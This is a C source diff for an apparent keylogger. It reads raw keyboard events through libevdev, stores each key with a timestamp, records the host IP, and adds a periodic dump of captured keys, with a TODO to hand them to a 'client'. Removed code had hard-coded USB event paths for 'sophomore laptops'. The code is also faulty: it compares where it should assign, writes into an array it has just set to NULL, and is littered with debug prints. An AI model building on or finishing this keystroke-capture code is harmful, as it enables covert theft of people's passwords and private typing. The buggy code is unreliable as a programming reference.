@@ -76,13 +76,17 @@ void log_device(key_package* key_package) {
   printf("Host IP: %s\n", IPbuffer);
 }
 
+void reset_structs(key_package* key_package) {
+  key_package->keys = NULL;
+  key_package->keys_arr_size = 0;
+}
+
 void log_keys(key_package* key_package) {
   // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html
 
   // open a device, as libevdev expects a file descriptor. You should have root
   // permissions
   struct libevdev* keyboard_dev;
-  struct libevdev* external_keyboard_dev;
   int rc;
 
   // get keyboard inputs event file
@@ -98,55 +102,14 @@ void log_keys(key_package* key_package) {
     exit(0);
   }
 
-  // check the 3 USB ports in the event they are external keyboards
-  // On the sophomore laptops, 25 is the bottom right, 27 is the left, and 28 is
-  // the top right USB port
-  int external_fd;
-  for (size_t i = 0; i < 3; ++i) {
-    // TODO: replace with better implementation
-    char* event_path;
-    if (i == 0) {
-      event_path = "/dev/input/event25";
-    } else if (i == 1) {
-      event_path = "/dev/input/event27";
-    } else if (i == 2) {
-      event_path == "/dev/input/event28";
-    }
-    // printf("event path: %s\n", event_path);
-    external_fd = open(event_path, O_RDONLY | O_NONBLOCK);
 
-    if (external_fd < 0) {
-      printf("No device found for %s\n", event_path);
-      continue;
-    }
-    // check that the event is a keyboard. If so, exit this loop immediately
-    rc = libevdev_new_from_fd(external_fd, &external_keyboard_dev);
-    if (rc < 0) {
-      fprintf(stderr, "error with setting rc for %s: %d %s\n", event_path, -rc,
-              strerror(-rc));
-      exit(0);
-    }
-    // check if the event represents a keyboard
-    if (libevdev_has_event_type(external_keyboard_dev, EV_KEY) == 1) {
-      printf("passed check 1\n");
-      if (libevdev_has_event_code(external_keyboard_dev, EV_KEY, KEY_A)) {
-        printf("%s is a keyboard\n", event_path);
-        break;
-      }
-    }
 
-    // if this is the third loop and there is no keyboard, set extrenal_fd =
-    // NULL
-    if (i == 2) {
-      printf("No external keyboards found.\n");
-      external_fd = NULL;
-    }
-  }
+  int counter = 0;
 
   while (1) {
+    ++counter;
     struct input_event ev;
 
-    // other options: LIBEVDEV_READ_FLAG_NORMAL
     rc = libevdev_next_event(keyboard_dev, LIBEVDEV_READ_FLAG_BLOCKING, &ev);
     if (rc < 0) {
       // note that this section runs when no event is occurring, NOT necessarily
@@ -171,21 +134,33 @@ void log_keys(key_package* key_package) {
               .key = libevdev_event_code_get_name(ev.type, ev.code),
               .timestamp = asctime(timeinfo)};
 
+          printf("1 %d\n", key_package->keys_arr_size);
+          printf("2 %c\n", pressed_key.key);
+          
+          printf("3 %c\n", key_package->keys[0].key);
+          printf("4 %c\n", key_package->keys[key_package->keys_arr_size].key);
+
           // append to key_package->keys
           key_package->keys[key_package->keys_arr_size] = pressed_key;
+          printf("a fine delightful evening\n");
           key_package->keys_arr_size++;
-
-          // printf("New key_package array size: %ld\n",
-          // key_package->keys_arr_size);
+          printf("shitters\n");
         }
       }
     } else {
       printf("unsure of what is going on here..\n");
     }
 
-    // TODO: change this. instead of writing to the file upon exiting
-    // upon pressing "c" (represented by code 46), it should write to the
-    // file every few seconds.
+    if (counter == 10000000) {
+      printf("resetting counter\n");
+      counter = 0;
+      // TODO: pass this info to the client to store
+      print_logged_keys(*key_package);
+      if (key_package->keys_arr_size != 0) {
+        reset_structs(key_package);
+      }
+    }
+
     if (ev.code == 107) {
       printf("\nexiting\n");
 
